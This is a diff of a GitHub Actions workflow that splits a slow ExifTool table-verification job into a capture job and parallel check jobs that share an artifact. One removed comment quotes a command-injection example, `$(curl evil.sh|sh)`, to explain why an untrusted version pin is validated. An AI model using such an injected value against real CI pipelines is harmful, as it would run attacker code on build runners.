@@ -439,67 +439,61 @@ jobs:
   # fabricated or drifted entry rather than on a mismatched formatting guess.
   # verify.py reads Rust as text; verify_subdirs.py additionally builds a
   # throwaway harness to execute the committed Start/Base forms.
-  verify-tables:
-    name: Verify Generated Tables
-    # This job keeps a module-complete native writer capture: CheckExif's
-    # freshness ledger records every omitted source table as well as its one
-    # admitted recipe, so an Exif-only capture would silently weaken coverage.
-    # On the 2x class three consecutive PR #768 attempts were SIGTERM'd around
-    # six minutes while the redirected complete dump was still running. This
-    # termination pattern does not establish its cause. Try the already
-    # supported 4x class while retaining the full source inventory.
+  # The generated ExifTool tables are checked by five jobs that fan out from
+  # one native capture, then report under the single "Verify Generated
+  # Tables" name below. Serially this was ~38 min on a WarpBuild 4x runner and
+  # ~70 min on a standard GitHub-hosted runner (single-threaded Perl/Python,
+  # so more cores on one runner did not help); fanned out, the long pole is
+  # the capture plus the slowest dependent job.
+  #
+  # The full dump is 1.25 GB of JSON (16 MB zstd); it is captured once and
+  # passed as an artifact so every dependent job checks the same bytes.
+  verify-tables-capture:
+    name: Verify Generated Tables / capture
     runs-on: ubuntu-latest
-    # PR #779 run 34914682473 reached the 35m cap after source-bound replay,
-    # table verification and tier-2 regeneration, while the full tool suite
-    # was still exercising native source mutations. Keep all checks and allow
-    # a finite hour for the complete capture, verification and mutation suite.
-    timeout-minutes: 60
+    timeout-minutes: 30
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      # The release comes from .exiftool-version, the repo-wide pin. This job
-      # used to read it from the artifact's own EXIFTOOL_VERSION stamp, on the
-      # reasoning that a version here would be a second source of truth -- but
-      # that made the check circular: a stale table set named the release it
-      # would be graded against, so it chose its own oracle and passed forever.
-      # The tables sat at 13.30 for 29 releases while every coverage number in
-      # the repo was measured against the pinned 13.59, and this job stayed
-      # green throughout. verify.py now also refuses a stamp that isn't the pin,
-      # so the two files must agree for this job to pass at all.
-      # The pin is read out of a file the pull request controls, so it is
-      # untrusted input. It is validated against a strict numeric pattern here
-      # and passed onward through env rather than `${{ }}` interpolation: a
-      # value like `$(curl evil.sh|sh)` expanded inside a run: block would be
-      # remote code execution on a fork PR.
-      - name: Resolve pinned ExifTool release
-        id: stamp
-        run: |
-          set -euo pipefail
-          V=$(tr -d '[:space:]' < .exiftool-version)
-          [ -n "$V" ] || { echo "::error::.exiftool-version is empty"; exit 1; }
-          case "$V" in
-            *[!0-9.]* | "" | .* | *.) echo "::error::refusing non-numeric ExifTool version '$V'"; exit 1 ;;
-          esac
-          echo "version=$V" >> "$GITHUB_OUTPUT"
-          echo "Repo pins ExifTool $V"
-      - name: Fetch that ExifTool source
+      - id: exiftool
+        uses: ./.github/actions/pinned-exiftool
+      # This keeps a module-complete native writer capture: CheckExif's
+      # freshness ledger records every omitted source table as well as its
+      # one admitted recipe, so an Exif-only capture would silently weaken
+      # coverage. The three captures are independent Perl processes, so they
+      # run concurrently on this runner's cores.
+      - name: Capture hydrated reader graph, full dump, processor inventory and Garmin FIT protocol
         env:
-          ET_VERSION: ${{ steps.stamp.outputs.version }}
+          ET_VERSION: ${{ steps.exiftool.outputs.version }}
         run: |
           set -euo pipefail
-          # runner.temp is not available in job-level env expressions.
-          # Resolve it at runtime and share one external tree with later steps.
-          EXIFTOOL_SOURCE="$RUNNER_TEMP/oxidex-table-oracle"
-          echo "EXIFTOOL_SOURCE=$EXIFTOOL_SOURCE" >> "$GITHUB_ENV"
-          curl --fail --silent --show-error --location -o "$RUNNER_TEMP/exiftool-tables.tar.gz" \
-            "https://github.com/exiftool/exiftool/archive/refs/tags/${ET_VERSION}.tar.gz"
-          mkdir -p "$EXIFTOOL_SOURCE"
-          tar xzf "$RUNNER_TEMP/exiftool-tables.tar.gz" -C "$EXIFTOOL_SOURCE" --strip-components=1
-      - name: Install oracle container support
-        run: |
-          # verify_subdirs.py probes DOCX parsing as well as the version.
-          # A Perl without Archive::Zip reports ZIP and is not a valid oracle.
-          sudo cpanm --notest Archive::Zip 2>/dev/null || sudo cpan -T Archive::Zip
-          perl -MArchive::Zip -e 1
+          unset PERL5LIB PERLLIB PERL5OPT
+          OUT="$RUNNER_TEMP/verify-tables-capture"
+          mkdir -p "$OUT"
+          perl tools/exiftool-tables/dump_tables.pl --reader-only --hydrated-layouts \
+            "$EXIFTOOL_SOURCE/lib" > "$OUT/hydrated-reader.json" & hydrated=$!
+          perl tools/exiftool-tables/dump_tables.pl "$EXIFTOOL_SOURCE/lib" > "$OUT/catalog-writer-source.json" & full=$!
+          perl tools/exiftool-tables/oracle.pl "$EXIFTOOL_SOURCE/lib" > "$OUT/native-processors-${ET_VERSION}.tsv" & processors=$!
+          perl tools/exiftool-tables/capture_garmin_fit_fact.pl "$EXIFTOOL_SOURCE/lib" > "$OUT/garmin-fit-protocol.json" & garmin=$!
+          wait "$hydrated"; wait "$full"; wait "$processors"; wait "$garmin"
+          for file in "$OUT"/*; do test -s "$file"; done
+          zstd -q -T0 --rm "$OUT"/*.json
+          ls -l "$OUT"
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: verify-tables-capture
+          path: ${{ runner.temp }}/verify-tables-capture
+          retention-days: 1
+          compression-level: 0
+
+  # Checks that need only the fetched ExifTool tree, not the capture.
+  verify-tables-source:
+    name: Verify Generated Tables / source and tier 2
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - id: exiftool
+        uses: ./.github/actions/pinned-exiftool
       - uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
         with:
           components: rustfmt
@@ -508,14 +502,81 @@ jobs:
           python3 tools/exiftool-tables/catalog_snapshot.py \
             --exiftool-dir "$EXIFTOOL_SOURCE" --perl perl \
             --output "docs/public/measurements/catalog-source-$(cat .exiftool-version).json" --check
-      - name: Capture and audit hydrated reader table graph
+      - name: Verify committed tables against ExifTool
+        env:
+          ET_VERSION: ${{ steps.exiftool.outputs.version }}
+        run: |
+          python3 tools/exiftool-tables/verify.py \
+            src/exiftool_tables/binary_tables.rs \
+            "$EXIFTOOL_SOURCE/lib" \
+            --oracle tools/exiftool-tables/oracle.pl \
+            --keyed-generated src/exiftool_tables/keyed_tables.rs \
+            --word-processor Image::ExifTool::CanonCustom::ProcessCanonCustom \
+            --native-inventory --native-inventory-table Sony:Tag202a
+          # verify.py independently checks which edges should be present;
+          # this runs their actual Start/Base arithmetic against the pinned
+          # ProcessBinaryData Perl eval scope (ExifTool.pm:10118-10137).
+          python3 tools/exiftool-tables/verify_subdirs.py \
+            src/exiftool_tables/binary_tables.rs \
+            "$EXIFTOOL_SOURCE/lib" \
+            --exiftool "$EXIFTOOL_SOURCE/exiftool"
+      # Step 14 (tag-machinery overhaul): tier 1 above is binary_tables.rs;
+      # tier 2 is everything downstream of it that regen.sh never touches --
+      # the MakerNote sub-directory tables, the Nikon AF-point grids and the
+      # six scripts/gen_*.pl one-off transcriptions. Until this step existed,
+      # nothing re-ran tier 2 in CI at all, so a bump could refresh tier 1 to
+      # a new ExifTool release while every tier-2 file quietly stayed on the
+      # old one -- intra-repo mixed-release skew invisible from either tier
+      # alone (see tools/exiftool-tables/regen-all.sh's header). Re-running
+      # every tier-2 generator against the SAME fetched tree as the verify
+      # step above and diffing the result against what is committed is the
+      # tier-2 analogue of verify.py: it fails on a stale or hand-edited
+      # generated file instead of on a formatting guess.
+      # regen-all also verifies complete GeoTIFF, DICOM and lens facts against
+      # loaded Perl independently of their producers before the drift check.
+      - name: Regenerate tier 2, verify independent facts and check drift
+        env:
+          ET_VERSION: ${{ steps.exiftool.outputs.version }}
+        run: |
+          set -euo pipefail
+          export OXIDEX_EXIFTOOL_LIB="$EXIFTOOL_SOURCE/lib"
+          tools/exiftool-tables/regen-all.sh --tier2-only
+          if ! python3 tools/exiftool-tables/artifacts.py diff --tier 2; then
+            echo "::error::a committed tier-2 generated file does not match what its generator produces against ExifTool ${ET_VERSION}. Either the file was hand-edited, or it is stale relative to the pin -- re-run 'tools/exiftool-tables/regen-all.sh --tier2-only' and commit the result." >&2
+            exit 1
+          fi
+      # Tag-machinery overhaul Step 16 (R5 stage 1 / R9(a)): the same
+      # rerun-and-diff idea as tier 2 above, applied to hand-embedded facts
+      # that have no generator at all -- three sub-checks: data-diffable
+      # fixtures, the coarse enum-fingerprint drift baseline for the six
+      # generator-less files plus canon.rs, and the Stage 1 formula/condition
+      # anchor snapshots (see `just check-staleness`'s own header for why each
+      # exists; this step is that recipe's body inlined so it does not need a
+      # `just` binary on this runner). Reuses the SAME extracted tree the two
+      # steps above already fetched, rather than fetching ExifTool a third
+      # time in this job.
+      - name: Check Perl-source anchors
+        run: python3 tools/exiftool-tables/check_perl_anchors.py "$EXIFTOOL_SOURCE"
+
+  verify-tables-catalog:
+    name: Verify Generated Tables / catalog join
+    needs: [verify-tables-capture]
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - id: exiftool
+        uses: ./.github/actions/pinned-exiftool
+      - uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
+        with:
+          components: rustfmt
+      - uses: ./.github/actions/verify-tables-capture
+      - name: Audit hydrated reader table graph
         run: |
           set -euo pipefail
           export EXIFTOOL_PERL=perl OXIDEX_PINNED_EXIFTOOL="$EXIFTOOL_SOURCE"
           python3 -m unittest discover -s tools/exiftool-tables -p 'test_hydrated_layout_projection.py'
           python3 -m unittest discover -s tools/exiftool-tables -p 'test_audit_hydrated_layouts.py'
-          perl tools/exiftool-tables/dump_tables.pl --reader-only --hydrated-layouts \
-            "$EXIFTOOL_SOURCE/lib" > "$RUNNER_TEMP/hydrated-reader.json"
           python3 tools/exiftool-tables/audit_hydrated_layouts.py \
             --dump "$RUNNER_TEMP/hydrated-reader.json" --output "$RUNNER_TEMP/hydrated-reader-audit.json" \
             --expected-audit "docs/public/measurements/hydrated-reader-layout-audit-$(cat .exiftool-version).json" \
@@ -527,11 +588,9 @@ jobs:
           python3 -m unittest discover -s tools/exiftool-tables -p 'test_replay_ifd_catalog_inputs.py'
           python3 -m unittest discover -s tools/exiftool-tables -p 'test_catalog_userdata.py'
           python3 -m unittest discover -s tools/exiftool-tables -p 'test_catalog_garmin_fit.py'
-          # One post-load full dump binds writer declarations to this runner's
-          # pinned native closure.  The hydrated reader dump remains the
+          # The capture job's post-load full dump binds writer declarations to
+          # the pinned native closure.  The hydrated reader dump remains the
           # catalog source coordinate authority.
-          perl tools/exiftool-tables/dump_tables.pl "$EXIFTOOL_SOURCE/lib" > "$RUNNER_TEMP/catalog-writer-source.json"
-          perl tools/exiftool-tables/capture_garmin_fit_fact.pl "$EXIFTOOL_SOURCE/lib" > "$RUNNER_TEMP/garmin-fit-protocol.json"
           # Expression proofs and IFD identity ledgers bind the entire capture,
           # including interpreter-specific envelopes. Re-prove on this runner;
           # never relabel the committed oracle as a fresh native observation.
@@ -609,80 +668,40 @@ jobs:
             echo '=== instrument: catalog observed receipt check ==='
             echo 'No published native receipt yet; source declaration ledger remains independent.'
           fi
-      - name: Verify committed tables against ExifTool
+
+  # The tools suite (~1,500 unittest cases, ~20 min serially on WarpBuild 4x)
+  # is split into balanced shards by tools/ci/unittest_shard.py using the
+  # committed per-test timings in tools/ci/unittest_weights.json. Every test
+  # id lands in exactly one shard, so the shards together run the full suite.
+  verify-tables-tools:
+    name: Verify Generated Tables / tools ${{ matrix.shard }}/6
+    needs: [verify-tables-capture]
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6]
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - id: exiftool
+        uses: ./.github/actions/pinned-exiftool
+      - uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
+        with:
+          components: rustfmt
+      - uses: ./.github/actions/verify-tables-capture
+      - name: Run tools suite shard
         env:
-          ET_VERSION: ${{ steps.stamp.outputs.version }}
-        run: |
-          python3 tools/exiftool-tables/verify.py \
-            src/exiftool_tables/binary_tables.rs \
-            "$EXIFTOOL_SOURCE/lib" \
-            --oracle tools/exiftool-tables/oracle.pl \
-            --keyed-generated src/exiftool_tables/keyed_tables.rs \
-            --word-processor Image::ExifTool::CanonCustom::ProcessCanonCustom \
-            --native-inventory --native-inventory-table Sony:Tag202a
-          # verify.py independently checks which edges should be present;
-          # this runs their actual Start/Base arithmetic against the pinned
-          # ProcessBinaryData Perl eval scope (ExifTool.pm:10118-10137).
-          python3 tools/exiftool-tables/verify_subdirs.py \
-            src/exiftool_tables/binary_tables.rs \
-            "$EXIFTOOL_SOURCE/lib" \
-            --exiftool "$EXIFTOOL_SOURCE/exiftool"
-      # Step 14 (tag-machinery overhaul): tier 1 above is binary_tables.rs;
-      # tier 2 is everything downstream of it that regen.sh never touches --
-      # the MakerNote sub-directory tables, the Nikon AF-point grids and the
-      # six scripts/gen_*.pl one-off transcriptions. Until this step existed,
-      # nothing re-ran tier 2 in CI at all, so a bump could refresh tier 1 to
-      # a new ExifTool release while every tier-2 file quietly stayed on the
-      # old one -- intra-repo mixed-release skew invisible from either tier
-      # alone (see tools/exiftool-tables/regen-all.sh's header). Re-running
-      # every tier-2 generator against the SAME fetched tree as the verify
-      # step above and diffing the result against what is committed is the
-      # tier-2 analogue of verify.py: it fails on a stale or hand-edited
-      # generated file instead of on a formatting guess.
-      # regen-all also verifies complete GeoTIFF, DICOM and lens facts against
-      # loaded Perl independently of their producers before the drift check.
-      - name: Regenerate tier 2, verify independent facts and check drift
-        env:
-          ET_VERSION: ${{ steps.stamp.outputs.version }}
+          ET_VERSION: ${{ steps.exiftool.outputs.version }}
+          SHARD: ${{ matrix.shard }}
         run: |
           set -euo pipefail
-          export OXIDEX_EXIFTOOL_LIB="$EXIFTOOL_SOURCE/lib"
-          tools/exiftool-tables/regen-all.sh --tier2-only
-          if ! python3 tools/exiftool-tables/artifacts.py diff --tier 2; then
-            echo "::error::a committed tier-2 generated file does not match what its generator produces against ExifTool ${ET_VERSION}. Either the file was hand-edited, or it is stale relative to the pin -- re-run 'tools/exiftool-tables/regen-all.sh --tier2-only' and commit the result." >&2
-            exit 1
-          fi
-      # Tag-machinery overhaul Step 16 (R5 stage 1 / R9(a)): the same
-      # rerun-and-diff idea as tier 2 above, applied to hand-embedded facts
-      # that have no generator at all -- three sub-checks: data-diffable
-      # fixtures, the coarse enum-fingerprint drift baseline for the six
-      # generator-less files plus canon.rs, and the Stage 1 formula/condition
-      # anchor snapshots (see `just check-staleness`'s own header for why each
-      # exists; this step is that recipe's body inlined so it does not need a
-      # `just` binary on this runner). Reuses the SAME extracted tree the two
-      # steps above already fetched, rather than fetching ExifTool a third
-      # time in this job.
-      - name: Check tool artifacts, staleness facts, drift baselines and Perl-source anchors
-        env:
-          ET_VERSION: ${{ steps.stamp.outputs.version }}
-        run: |
-          set -euo pipefail
-          # Stage 0 (needs neither ExifTool nor a dump): the committed
-          # artifacts under tools/exiftool-tables/ that grade themselves.
-          # `expr_oracle_ledger.json` was schema 1 while codegen.py required
-          # schema 2 -- REFUSED on every host regardless of digest -- and
-          # `rg -n 'expr_oracle_ledger' justfile .github/workflows/*.yml`
-          # returned zero hits, so nothing anywhere said so. Same recipe as
-          # `just check-staleness`'s stage 0, inlined (no `just` on this
-          # runner).
           ROOT="$EXIFTOOL_SOURCE"
           LIB="$ROOT/lib"
           DUMP="$RUNNER_TEMP/catalog-writer-source.json"
           PROCESSORS="$RUNNER_TEMP/native-processors-${ET_VERSION}.tsv"
           unset PERL5LIB PERLLIB PERL5OPT
           export EXIFTOOL_PERL=perl LENS_TEST_PERL=perl
-          # Reuse the complete capture already independently replayed above.
-          "$EXIFTOOL_PERL" tools/exiftool-tables/oracle.pl "$LIB" > "$PROCESSORS"
           test -s "$DUMP"
           test -s "$PROCESSORS"
           test -f "$LIB/Image/ExifTool/CanonCustom.pm"
@@ -691,7 +710,6 @@ jobs:
           export OXIDEX_PINNED_EXIFTOOL="$ROOT"
           export OXIDEX_TABLES_JSON="$DUMP" OXIDEX_SONY_DUMP="$DUMP"
           export OXIDEX_SERIAL_RUST="$GITHUB_WORKSPACE/src/exiftool_tables/serial_tables.rs"
-          python3 tools/exiftool-tables/verify_serial_directory.py "$OXIDEX_SERIAL_RUST" "$DUMP"
           # Exercise mutations of the actual generated parent/child artifacts,
           # including a downgrade that removes both processor and validation.
           export OXIDEX_IFD_SERIAL_MUTATION_TEST=1
@@ -702,8 +720,32 @@ jobs:
           export OXIDEX_PROCESSOR_INVENTORY="$PROCESSORS"
           export OXIDEX_WORD_PROCESSOR=Image::ExifTool::CanonCustom::ProcessCanonCustom
           export OXIDEX_ALLOW_DIRTY_TREE=1
-          (cd tools/exiftool-tables && python3 -m unittest discover -p 'test_*.py' -v)
+          cd tools/exiftool-tables
+          python3 ../ci/unittest_shard.py --weights ../ci/unittest_weights.json --shard "$SHARD" --of 6
 
+  verify-tables-drift:
+    name: Verify Generated Tables / staleness and drift
+    needs: [verify-tables-capture]
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - id: exiftool
+        uses: ./.github/actions/pinned-exiftool
+      - uses: ./.github/actions/verify-tables-capture
+      # Tag-machinery overhaul Step 16 (R5 stage 1 / R9(a)): the rerun-and-diff
+      # idea applied to hand-embedded facts that have no generator at all --
+      # data-diffable fixtures, the coarse enum-fingerprint drift baseline for
+      # the generator-less files plus canon.rs, and the serial directory
+      # descriptor (see `just check-staleness`'s header for why each exists).
+      - name: Check serial directory, staleness facts and drift baselines
+        env:
+          ET_VERSION: ${{ steps.exiftool.outputs.version }}
+        run: |
+          set -euo pipefail
+          DUMP="$RUNNER_TEMP/catalog-writer-source.json"
+          python3 tools/exiftool-tables/verify_serial_directory.py \
+            "$GITHUB_WORKSPACE/src/exiftool_tables/serial_tables.rs" "$DUMP"
           TMPFIX="$RUNNER_TEMP/staleness-fixtures"
           mkdir -p "$TMPFIX"
           python3 tools/exiftool-tables/gen_staleness_facts.py "$DUMP" "$TMPFIX"
@@ -734,18 +776,29 @@ jobs:
             "src/parsers/tiff/makernotes/minolta_a100_tables.rs=Minolta" \
             "src/parsers/tiff/makernotes/canon.rs=Canon"
 
-          python3 tools/exiftool-tables/check_perl_anchors.py "$ROOT"
-      # The data-diffable half of these same facts runs as real `cargo test`s
-      # against the fixtures the step above just confirmed are current --
-      # hermetic (no /tmp, no network: the fixtures are embedded at compile
-      # time via `include_str!`), so they run as part of `cargo nextest run
-      # --all-features` in the Build & Test job already, matched on the
-      # `staleness` module name pattern
-      # (parsers::tiff::makernote_dispatcher::staleness_tests,
-      # parsers::tiff::makernotes::{canon,fujifilm,pentax,lens_data::canon}::
-      # *staleness*). Not re-run here: this job has no Rust build cache, and
-      # a from-scratch compile would blow its 10-minute budget for a check
-      # the other job already gates on every push.
+
+  # The single check name reported for all of the above. Not a required
+  # status check today; it fails unless every fan-out job succeeded.
+  verify-tables:
+    name: Verify Generated Tables
+    needs: [verify-tables-capture, verify-tables-source, verify-tables-catalog, verify-tables-tools, verify-tables-drift]
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Require every Verify Generated Tables job
+        env:
+          RESULTS: ${{ toJSON(needs) }}
+        run: |
+          set -euo pipefail
+          echo "$RESULTS" | python3 -c '
+          import json, sys
+          needs = json.load(sys.stdin)
+          bad = {name: job["result"] for name, job in needs.items() if job["result"] != "success"}
+          for name, job in sorted(needs.items()):
+              print(f"{name}: {job[\"result\"]}")
+          sys.exit(f"failed or skipped: {bad}" if bad else 0)
+          '
 
   metrics:
     name: Benchmarks
